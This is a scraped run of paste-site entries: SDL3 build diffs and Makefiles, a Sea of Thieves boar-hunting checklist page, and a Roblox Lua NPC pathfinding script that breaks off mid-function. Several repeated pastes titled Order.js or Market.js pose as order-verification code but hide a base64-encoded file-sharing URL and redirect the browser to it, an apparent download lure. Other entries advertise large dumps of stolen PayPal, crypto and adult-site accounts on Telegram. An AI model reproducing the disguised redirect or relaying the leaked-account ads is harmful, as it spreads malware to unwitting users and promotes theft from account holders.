@@ -1,4 +1,4 @@
-#include <SDL_image.h>
+#include <SDL3_image/SDL_image.h>
 #include <SDL3/SDL_render.h>
 #include <SDL3/SDL_timer.h>
 #include <iostream>
diff --git a/SDL3Test/UltimaDungeon.cpp b/SDL3Test/UltimaDungeon.cpp
index 8ae5252..acc3067 100644
--- a/SDL3Test/UltimaDungeon.cpp
+++ b/SDL3Test/UltimaDungeon.cpp
@@ -1,4 +1,4 @@
-#include <SDL_image.h>
+#include <SDL3_image/SDL_image.h>
 #include ""UltimaDungeon.h""
 #include ""UltimaGraphics.h""
 #include ""U3Misc.h""
"
vMGZn3vQ,Products.js,zebmekey,JavaScript,Sunday 27th of April 2025 09:42:30 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/21679/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
hSZH5Ctu,Crypto Accounts,jm33,JavaScript,Sunday 27th of April 2025 09:37:01 AM CDT,68517 Accounts Posted On https://t.me/leakedbyem1nem
EuWMAx9y,2025-04-27T08:29:02.802499,powerampache,PHP,Sunday 27th of April 2025 09:29:05 AM CDT,"1.01-80-play (80) - DB: 83
retrofit2.HttpException: HTTP 404 { ""exception"" : ""java.security.cert.CertPathValidatorException: Trust anchor for certification path not found."" }
	at retrofit2.KotlinExtensions$await$2$2.onResponse(KotlinExtensions.kt:53)
	at retrofit2.OkHttpCall$1.onResponse(OkHttpCall.java:164)
	at okhttp3.internal.connection.RealCall$AsyncCall.run(RealCall.kt:529)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:644)
	at java.lang.Thread.run(Thread.java:1012)

"
fSSYNVmn,Order.js,zebmekey,JavaScript,Sunday 27th of April 2025 09:27:07 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/17151/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
MCnr88Nj,PayPal with Balance,jm33,JavaScript,Sunday 27th of April 2025 09:21:38 AM CDT,91054 Accounts Posted On https://t.me/leakedbyem1nem
1Ht66sgE,Market.js,zebmekey,JavaScript,Sunday 27th of April 2025 09:11:44 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/43432/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
Mr8JDmmx,Nagad manual,modtechmaster,JSON,Sunday 27th of April 2025 09:07:49 AM CDT,"{
  ""title"": ""Nagad manual Otp"",
  ""dis"": ""সম্পূর্ণ ফ্রি কেউ টাকা দিয়ে কিনবেন না"",
  ""link"": ""https://t.me/Mod_Tech_Master"",
  ""show"": false
}
"
3ZSyRxhE,Leaked Accounts - Fresh Hits,jm33,JavaScript,Sunday 27th of April 2025 09:06:17 AM CDT,34141 Accounts Posted On https://t.me/leakedbyem1nem
BkEPYChj,Untitled,zebmekey,JavaScript,Sunday 27th of April 2025 08:56:23 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/70221/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
FE6A9AGU,Chaturbate with Tokens,jm33,JavaScript,Sunday 27th of April 2025 08:50:55 AM CDT,84808 Accounts Posted On https://t.me/leakedbyem1nem
m3dJYJa2,Untitled,dominus,Make,Sunday 27th of April 2025 08:45:11 AM CDT,"# Compiler and flags
CC = gcc
CXX = g++
CFLAGS = -w -std=c++20
CXXFLAGS = $(CFLAGS)

# Find SDL3 packages using pkg-config
PKGS = sdl3 sdl3-image sdl3-ttf libxml-2.0
CFLAGS += $(shell pkg-config --cflags $(PKGS))
CXXFLAGS += $(shell pkg-config --cflags $(PKGS))
LIBS = $(shell pkg-config --libs $(PKGS))

# Directories
SRC_DIR = SDL3Test
OBJ_DIR = obj
BIN_DIR = bin

# Find all source files
SRCS = $(wildcard $(SRC_DIR)/*.c) $(wildcard $(SRC_DIR)/*.cpp)
OBJS = $(patsubst $(SRC_DIR)/%.c,$(OBJ_DIR)/%.o,$(filter %.c,$(SRCS))) \
	$(patsubst $(SRC_DIR)/%.cpp,$(OBJ_DIR)/%.o,$(filter %.cpp,$(SRCS)))

# Target executable name
TARGET = $(BIN_DIR)/LairwareSDL3

# Default target
all: dirs $(TARGET)

# Create necessary directories
dirs:
	@mkdir -p $(OBJ_DIR) $(BIN_DIR)

# Link object files
$(TARGET): $(OBJS)
	$(CXX) -o $@ $^ $(LIBS)

# Compile C source files
$(OBJ_DIR)/%.o: $(SRC_DIR)/%.c
	$(CC) $(CFLAGS) -c $< -o $@

# Compile C++ source files
$(OBJ_DIR)/%.o: $(SRC_DIR)/%.cpp
	$(CXX) $(CXXFLAGS) -c $< -o $@

# Clean up
clean:
	rm -rf $(OBJ_DIR) $(BIN_DIR)

# Run the application
run: all
	$(TARGET)

.PHONY: all dirs clean run"
w5XJcXic,Untitled,dominus,Make,Sunday 27th of April 2025 08:42:58 AM CDT,"# Compiler and flags
CC = gcc
CXX = g++
CFLAGS = -w
CXXFLAGS = $(CFLAGS) -std=c++20 -I/opt/arm64/include
LDFLAGS = -L/opt/arm64/lib
SYSLIBS = -framework CoreFoundation

# Find SDL3 packages using pkg-config
PKGS = sdl3 sdl3-image sdl3-ttf libxml-2.0
CFLAGS += $(shell pkg-config --cflags $(PKGS))
CXXFLAGS += $(shell pkg-config --cflags $(PKGS))
LIBS = $(shell pkg-config --libs $(PKGS))

# Directories
SRC_DIR = SDL3Test
OBJ_DIR = obj
BIN_DIR = bin

# Find all source files
SRCS = $(wildcard $(SRC_DIR)/*.c) $(wildcard $(SRC_DIR)/*.cpp)
OBJS = $(patsubst $(SRC_DIR)/%.c,$(OBJ_DIR)/%.o,$(filter %.c,$(SRCS))) \
	$(patsubst $(SRC_DIR)/%.cpp,$(OBJ_DIR)/%.o,$(filter %.cpp,$(SRCS)))

# Target executable name
TARGET = $(BIN_DIR)/LairwareSDL3

# Default target
all: dirs $(TARGET)

# Create necessary directories
dirs:
	@mkdir -p $(OBJ_DIR) $(BIN_DIR)

# Link object files
$(TARGET): $(OBJS)
	$(CXX) -o $@ $^ $(LDFLAGS) $(LIBS) $(SYSLIBS)

# Compile C source files
$(OBJ_DIR)/%.o: $(SRC_DIR)/%.c
	$(CC) $(CFLAGS) -c $< -o $@

# Compile C++ source files
$(OBJ_DIR)/%.o: $(SRC_DIR)/%.cpp
	$(CXX) $(CXXFLAGS) -c $< -o $@

# Clean up
clean:
	rm -rf $(OBJ_DIR) $(BIN_DIR)

# Run the application
run: all
	$(TARGET)

.PHONY: all dirs clean run"
sZnNg4vT,Order.js,SpawnKz,JavaScript,Sunday 27th of April 2025 08:40:42 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/17820/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
kPZeWj35,Crypto Accounts,jm33,JavaScript,Sunday 27th of April 2025 08:35:33 AM CDT,73136 Accounts Posted On https://t.me/leakedbyem1nem
gJ2D14dh,Pristine,JackGrimm,HTML,Sunday 27th of April 2025 08:27:07 AM CDT,"<!DOCTYPE html>
<!--Created by JackGrimm -->
<html><head>
  <meta name=""viewport"" content=""width=device-width, initial-scale=1"">
  <link rel=""stylesheet"" href=""https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css"">
  <script src=""https://ajax.googleapis.com/ajax/libs/jquery/3.7.1/jquery.min.js""></script>
  <script src=""https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/js/bootstrap.min.js""></script>
  
  <script>
  
  </script>
  
</head>
<body>
<div class=""main"">
<h2 style=""text-align: center;"">Pristine Checklist</h2>

<div class=""container"">
<table class=""table table-striped table-bordered "">	
  <tbody>
	<tr>
	
	<p>What Outpost are you at? <button onClick=""window.location.reload();"" type=""button"" class=""btn btn-info"">Refresh Page</button></p>
	<p>Vote Boar Hunting voyages and see which islands are in the pool of available locations.</p>
	<p>Pristine Boars can't spawn on these islands.</p>
	</tr>
	
   <tr>
	<td><button type=""button"" class=""btn text-primary bg-primary"" data-toggle=""collapse"" data-target=""#Sanctuary"">Sanctuary</button>
	<div id=""Sanctuary"" class=""collapse"">
		<table class=""table table-striped table-bordered "">
		<tr><td>If all 4 islands appear in the voyage cycle, scuttle to a new sea.</td></tr>
		<tr><td><button type=""button"" class=""btn btn-info"" data-toggle=""collapse"" data-target=""#SanSmug"">Smuggler's Bay</button>
		<div id=""SanSmug"" class=""collapse"">No Pristine Here :(</td></tr>
		<tr><td><button type=""button"" class=""btn btn-info"" data-toggle=""collapse"" data-target=""#SanLone"">Lone Cove</button>
		<div id=""SanLone"" class=""collapse"">No Pristine Here :(</td></tr>
		<tr><td><button type=""button"" class=""btn btn-info"" data-toggle=""collapse"" data-target=""#SanCan"">Cannon Cove</button>
		<div id=""SanCan"" class=""collapse"">No Pristine Here :(</td></tr>
		<tr><td><button type=""button"" class=""btn btn-info"" data-toggle=""collapse"" data-target=""#SanCres"">Crescent Isle</button>
		<div id=""SanCres"" class=""collapse"">No Pristine Here :(</td></tr>
		<tr><td><button type=""button"" class=""btn btn-info"" data-toggle=""collapse"" data-target=""#SanOth"">Other (outside range)</button>
		<div id=""SanOth"" class=""collapse"">Wallow is near Sanctuary! Vote more voyages to elimiate islands, then search the Island for a Wallow.</td></tr>
		</table>
	</div>
	</td>
  </tr>
  
   <tr>
	<td><button type=""button"" class=""btn text-primary bg-primary"" data-toggle=""collapse"" data-target=""#Merrick"">Port Merrick</button>
	<div id=""Merrick"" class=""collapse"">
		<table class=""table table-striped table-bordered "">
		<tr><td>If all 3 islands appear in the voyage cycle, scuttle to a new sea.</td></tr>
		<tr><td><button type=""button"" class=""btn btn-info"" data-toggle=""collapse"" data-target=""#MerCan"">Cannon Cove</button>
		<div id=""MerCan"" class=""collapse"">No Pristine Here :(</td></tr>
		<tr><td><button type=""button"" class=""btn btn-info"" data-toggle=""collapse"" data-target=""#MerCres"">Crescent Isle</button>
		<div id=""MerCres"" class=""collapse"">No Pristine Here :(</td></tr>
		<tr><td><button type=""button"" class=""btn btn-info"" data-toggle=""collapse"" data-target=""#MerWan"">Wanderer's Refuge</button>
		<div id=""MerWan"" class=""collapse"">No Pristine Here :(</td></tr>
		<tr><td><button type=""button"" class=""btn btn-info"" data-toggle=""collapse"" data-target=""#MerOth"">Other (outside range)</button>
		<div id=""MerOth"" class=""collapse"">Wallow is near Port Merrick! Vote more voyages to elimiate islands, then search the Island for a Wallow.</td></tr>
		</table>
	</div>
	</td>
  </tr>
  
   <tr>
	<td><button type=""button"" class=""btn text-primary bg-primary"" data-toggle=""collapse"" data-target=""#Plunder"">Plunder Outpost</button>
	<div id=""Plunder"" class=""collapse"">
		<table class=""table table-striped table-bordered "">
		<tr><td>If all 3 islands appear in the voyage cycle, scuttle to a new sea.</td></tr>
		<tr><td><button type=""button"" class=""btn btn-info"" data-toggle=""collapse"" data-target=""#PluSna"">Snake Island</button>
		<div id=""PluSna"" class=""collapse"">No Pristine Here :(</td></tr>
		<tr><td><button type=""button"" class=""btn btn-info"" data-toggle=""collapse"" data-target=""#PluSB"">Sharkbait Cove</button>
		<div id=""PluSB"" class=""collapse"">No Pristine Here :(</td></tr>
		<tr><td><button type=""button"" class=""btn btn-info"" data-toggle=""collapse"" data-target=""#PluCro"">Crook's Hollow</button>
		<div id=""PluCro"" class=""collapse"">No Pristine Here :(</td></tr>
		<tr><td><button type=""button"" class=""btn btn-info"" data-toggle=""collapse"" data-target=""#PluOth"">Other (outside range)</button>
		<div id=""PluOth"" class=""collapse"">Wallow is near Plunder Outpost! Vote more voyages to elimiate islands, then search the Island for a Wallow.</td></tr>
		</table>
	</div>
	</td>
  </tr>
  
   <tr>
	<td><button type=""button"" class=""btn text-primary bg-primary"" data-toggle=""collapse"" data-target=""#Ancient"">Ancient Spire</button>
	<div id=""Ancient"" class=""collapse"">
		<table class=""table table-striped table-bordered "">
		<tr><td>If all 3 islands appear in the voyage cycle, scuttle to a new sea.</td></tr>
		<tr><td><button type=""button"" class=""btn btn-info"" data-toggle=""collapse"" data-target=""#AncKra"">Kraken's Fall</button>
		<div id=""AncKra"" class=""collapse"">No Pristine Here :(</td></tr>
		<tr><td><button type=""button"" class=""btn btn-info"" data-toggle=""collapse"" data-target=""#AncDev"">Devil's Ridge</button>
		<div id=""AncDev"" class=""collapse"">No Pristine Here :(</td></tr>
		<tr><td><button type=""button"" class=""btn btn-info"" data-toggle=""collapse"" data-target=""#AncCro"">Crook's Hollow</button>
		<div id=""AncCro"" class=""collapse"">No Pristine Here :(</td></tr>
		<tr><td><button type=""button"" class=""btn btn-info"" data-toggle=""collapse"" data-target=""#AncOth"">Other (outside range)</button>
		<div id=""AncOth"" class=""collapse"">Wallow is near Ancient Spire! Vote more voyages to elimiate islands, then search the Island for a Wallow.</td></tr>
		</table>
	</div>
	</td>
  </tr>

   <tr>
	<td><button type=""button"" class=""btn text-primary bg-primary"" data-toggle=""collapse"" data-target=""#Dagger"">Dagger Tooth</button>
	<div id=""Dagger"" class=""collapse"">
		<table class=""table table-striped table-bordered "">
		<tr><td>If all 3 islands appear in the voyage cycle, scuttle to a new sea.</td></tr>
		<tr><td><button type=""button"" class=""btn btn-info"" data-toggle=""collapse"" data-target=""#DagOld"">Old Faithful</button>
		<div id=""DagOld"" class=""collapse"">No Pristine Here :(</td></tr>
		<tr><td><button type=""button"" class=""btn btn-info"" data-toggle=""collapse"" data-target=""#DagSun"">Sunken Grove</button>
		<div id=""DagSun"" class=""collapse"">No Pristine Here :(</td></tr>
		<tr><td><button type=""button"" class=""btn btn-info"" data-toggle=""collapse"" data-target=""#DagShip"">Shipwreck Bay</button>
		<div id=""DagShip"" class=""collapse"">No Pristine Wallow Here :(</td></tr>
		<tr><td><button type=""button"" class=""btn btn-info"" data-toggle=""collapse"" data-target=""#DagOth"">Other (outside range)</button>
		<div id=""DagOth"" class=""collapse"">Wallow is near Dagger Tooth! Vote more voyages to elimiate islands, then search the Island for a Wallow.</td></tr>
		</table>
	</div>
	</td>
  </tr>
  
  
   <tr>
	<td><button type=""button"" class=""btn text-primary bg-primary"" data-toggle=""collapse"" data-target=""#Galleon"">Galleon's Grave</button>
	<div id=""Galleon"" class=""collapse"">
		<table class=""table table-striped table-bordered "">
		<tr><td>If all 2 islands appear in the voyage cycle, scuttle to a new sea.</td></tr>
		<tr><td><button type=""button"" class=""btn btn-info"" data-toggle=""collapse"" data-target=""#GalKra"">Kraken's Fall</button>
		<div id=""GalKra"" class=""collapse"">No Pristine Here :(</td></tr>
		<tr><td><button type=""button"" class=""btn btn-info"" data-toggle=""collapse"" data-target=""#GalSun"">Sunken Grove</button>
		<div id=""GalSun"" class=""collapse"">No Pristine Here :(</td></tr>
		<tr><td><button type=""button"" class=""btn btn-info"" data-toggle=""collapse"" data-target=""#GalOth"">Other (outside range)</button>
		<div id=""GalOth"" class=""collapse"">Wallow is near Galleon's Grave! Vote more voyages to elimiate islands, then search the Island for a Wallow.</td></tr>
		</table>
	</div>
	</td>
  </tr>
  
</div>

</table>
<p>Take a grappel gun and search for treasure glints.</p>
<p>Wallows will have 0 or 5 items.</p>
<p>If the Wallow is empty, scuttle to a new sea.</p>
<p>If the Wallow looks like it's missing items, DIG!!!</p>
</body></html>"
LWAyf37Y,Market.js,SpawnKz,JavaScript,Sunday 27th of April 2025 08:25:20 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/78714/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
zz2uuXLP,Kaizer's NPC AI System,KingAesthetic,Lua,Sunday 27th of April 2025 08:23:39 AM CDT,"local ZombieAI = {}

local ServerStorage = game:GetService(""ServerStorage"")
local PathfindingService = game:GetService(""PathfindingService"")
local Workspace = game:GetService(""Workspace"")
local Terrain = Workspace.Terrain
local NPCSound = require(game.ServerScriptService[""Kaizer's Modules""].NPCSound)

local CONFIG = {
	DetectionRange = 30,
	ChaseAbandonRange = 50,
	PatrolSpeed = 7,
	ChaseSpeed = 17,
	AttackDamage = 15,
	HealthRange = {50, 100},
	PatrolRadius = 25,
	ReturnDistanceThreshold = 5,
	ExplosionRadius = 10,
	ExplosionDamagePercent = 0.5,
	PatrolTimeout = 5,
	JumpHeight = 12,
	JumpStuckTimeout = 3,
	JumpHeightThreshold = 5, -- Chase: 5, Patrol: 7
	JumpMovementThreshold = 0.75,
	DescentHeightThreshold = 5,
	EdgeDetectionDistance = 25,
	LineOfSightAngle = 90,
	MaxSlopeAngle = 30,
	MinPatrolPointDelay = 2,
	MinWaypointDistance = 4,
	MaxLOSDistance = 50,
	JumpCooldown = 3,
	PatrolJumpCooldown = 5,
}

local zombieModel = ServerStorage:FindFirstChild(""Sentinel"")
local activeZombies = {}
local spawnedZombies = {}

-- Check if a position is on water
local function isWater(position)
	local voxelSize = 4
	local alignedPos = Vector3.new(
		math.floor(position.X / voxelSize) * voxelSize,
		math.floor(position.Y / voxelSize) * voxelSize,
		math.floor(position.Z / voxelSize) * voxelSize
	)
	local region = Region3.new(
		alignedPos - Vector3.new(voxelSize/2, voxelSize/2, voxelSize/2),
		alignedPos + Vector3.new(voxelSize/2, voxelSize/2, voxelSize/2)
	)
	local materials, _ = Terrain:ReadVoxels(region, voxelSize)
	if materials and materials[1] and materials[1][1] and materials[1][1][1] then
		return materials[1][1][1] == Enum.Material.Water
	end
	warn(""Failed to read terrain voxel at position: "" .. tostring(position))
	return false
end

-- Check if a position is walkable
local function isWalkable(position)
	local rayParams = RaycastParams.new()
	rayParams.FilterType = Enum.RaycastFilterType.Exclude
	rayParams.FilterDescendantsInstances = {Workspace:FindFirstChild(""Sentinel"") or {}}
	local offsets = {
		Vector3.new(0, 0, 0),
		Vector3.new(0.5, 0, 0), Vector3.new(-0.5, 0, 0),
		Vector3.new(0, 0, 0.5), Vector3.new(0, 0, -0.5),
	}
	local slopeAngles = {}
	local isValid = false
	for _, offset in ipairs(offsets) do
		local rayResult = Workspace:Raycast(position + Vector3.new(0, 50, 0) + offset, Vector3.new(0, -100, 0), rayParams)
		if rayResult and rayResult.Normal then
			local slopeAngle = math.deg(math.acos(rayResult.Normal.Y))
			local isMushroom2 = rayResult.Instance and rayResult.Instance.Name == ""Mushroom2""
			local isTree = rayResult.Instance and string.find(rayResult.Instance.Name:lower(), ""tree"") ~= nil
			if slopeAngle <= CONFIG.MaxSlopeAngle and not isWater(rayResult.Position) and not isMushroom2 and not isTree then
				table.insert(slopeAngles, slopeAngle)
				isValid = true
			end
		end
	end
	if isValid and #slopeAngles > 0 then
		local avgSlope = 0
		for _, angle in ipairs(slopeAngles) do
			avgSlope = avgSlope + angle
		end
		avgSlope = avgSlope / #slopeAngles
		-- print(""isWalkable hit at "" .. tostring(position) .. "", avg slope: "" .. avgSlope)
		return true, avgSlope
	end
	return false, 0
end

-- Check if a path is clear
local function isPathClear(startPos, endPos, zombie)
	local rayParams = RaycastParams.new()
	rayParams.FilterType = Enum.RaycastFilterType.Exclude
	rayParams.FilterDescendantsInstances = {zombie, Workspace:FindFirstChild(""Sentinel"") or {}}
	local direction = (endPos - startPos)
	local rayResult = Workspace:Raycast(startPos + Vector3.new(0, 2, 0), direction, rayParams)
	return not rayResult or (rayResult.Position - endPos).Magnitude < 1
end

-- Check if an obstacle is in the path
local function hasObstacle(startPos, endPos, zombie)
	local rayParams = RaycastParams.new()
	rayParams.FilterType = Enum.RaycastFilterType.Exclude
	rayParams.FilterDescendantsInstances = {zombie, Workspace:FindFirstChild(""Sentinel"") or {}}
	local direction = (endPos - startPos).Unit * 5 -- Check 5 studs ahead
	local rayResult = Workspace:Raycast(startPos + Vector3.new(0, 2, 0), direction, rayParams)
	if rayResult and rayResult.Instance then
		local isMushroom2 = rayResult.Instance.Name == ""Mushroom2""
		local isTree = string.find(rayResult.Instance.Name:lower(), ""tree"") ~= nil
		return not isMushroom2 and not isTree, rayResult.Position
	end
	return false, nil
end

-- Check line of sight
local function hasLineOfSight(zombie, target)
	local zombieHead = zombie:FindFirstChild(""Head"")
	local targetTorso = target:FindFirstChild(""HumanoidRootPart"")
	if not zombieHead or not targetTorso then
		return false
	end
	local directionToTarget = (targetTorso.Position - zombieHead.Position).Unit
	local zombieForward = zombie.HumanoidRootPart.CFrame.LookVector
	local angle = math.deg(math.acos(directionToTarget:Dot(zombieForward)))
	if angle > CONFIG.LineOfSightAngle / 2 then
		return false
	end
	local rayParams = RaycastParams.new()
	rayParams.FilterType = Enum.RaycastFilterType.Exclude
	rayParams.FilterDescendantsInstances = {zombie, target}
	local rayResult = Workspace:Raycast(zombieHead.Position, (targetTorso.Position - zombieHead.Position), rayParams)
	return not rayResult or (rayResult.Instance and rayResult.Instance:IsDescendantOf(target))
end

-- Find a valid patrol position
local function getValidPatrolPosition(spawnPos, currentPos, zombie)
	if not spawnPos or not currentPos then
		warn(""getValidPatrolPosition: Invalid inputs"")
		return spawnPos or Vector3.new(0, 0, 0)
	end
	local rayParams = RaycastParams.new()
	rayParams.FilterType = Enum.RaycastFilterType.Exclude
	rayParams.FilterDescendantsInstances = {Workspace:FindFirstChild(""Sentinel"") or {}}
	for _ = 1, 30 do
		local offset = Vector3.new(math.random(-CONFIG.PatrolRadius, CONFIG.PatrolRadius), 0, math.random(-CONFIG.PatrolRadius, CONFIG.PatrolRadius))
		local newPos = spawnPos + offset
		local rayResult = Workspace:Raycast(newPos + Vector3.new(0, 50, 0), Vector3.new(0, -100, 0), rayParams)
		if rayResult then
			local isWalkablePoint, slopeAngle = isWalkable(rayResult.Position)
			if isWalkablePoint and slopeAngle <= 5 and isPathClear(currentPos, rayResult.Position, zombie) then
				local path = PathfindingService:CreatePath()
				path:ComputeAsync(currentPos, rayResult.Position)
				if path.Status == Enum.PathStatus.Success then
					-- print(""Selected new patrol point: "" .. tostring(rayResult.Position) .. "", slope: "" .. slopeAngle)
					return rayResult.Position
				end
			end
		end
	end
	for _ = 1, 15 do
		local offset = Vector3.new(math.random(-5, 5), 0, math.random(-5, 5))
		local newPos = spawnPos + offset
		local rayResult = Workspace:Raycast(newPos + Vector3.new(0, 50, 0), Vector3.new(0, -100, 0), rayParams)
		if rayResult then
			local isWalkablePoint, slopeAngle = isWalkable(rayResult.Position)
			if isWalkablePoint and slopeAngle <= 5 and isPathClear(currentPos, rayResult.Position, zombie) then
				local path = PathfindingService:CreatePath()
				path:ComputeAsync(currentPos, rayResult.Position)
				if path.Status == Enum.PathStatus.Success then
					-- print(""Selected fallback patrol point: "" .. tostring(rayResult.Position) .. "", slope: "" .. slopeAngle)
					return rayResult.Position
				end
			end
		end
	end
	-- print(""Using spawnPos as patrol point fallback"")
	return spawnPos
end

-- Find a safe descent position
local function findDescentPosition(currentPos)
	local rayParams = RaycastParams.new()
	rayParams.FilterType = Enum.RaycastFilterType.Exclude
	rayParams.FilterDescendantsInstances = {Workspace:FindFirstChild(""Sentinel"") or {}}
	local directions = {
		Vector3.new(1, 0, 0), Vector3.new(-1, 0, 0),
		Vector3.new(0, 0, 1), Vector3.new(0, 0, -1),
		Vector3.new(1, 0, 1).Unit, Vector3.new(-1, 0, -1).Unit,
		Vector3.new(1, 0, -1).Unit, Vector3.new(-1, 0, 1).Unit,
	}
	local bestDescentPos = nil
	local minDistanceToGround = math.huge
	for _, direction in directions do
		for distance = 1, CONFIG.EdgeDetectionDistance do
			local checkPos = currentPos + direction * distance
			local rayResult = Workspace:Raycast(checkPos + Vector3.new(0, 5, 0), Vector3.new(0, -50, 0), rayParams)
			if rayResult then
				local groundHeight = rayResult.Position.Y
				local heightDifference = currentPos.Y - groundHeight
				if heightDifference > 0 and heightDifference <= CONFIG.JumpHeight * 1.5 and heightDifference < minDistanceToGround then
					bestDescentPos = checkPos
					minDistanceToGround = heightDifference
				end
			end
		end
	end
	return bestDescentPos
end

-- Find a climb position to reach an elevated target
local function findClimbPosition(currentPos, targetPos)
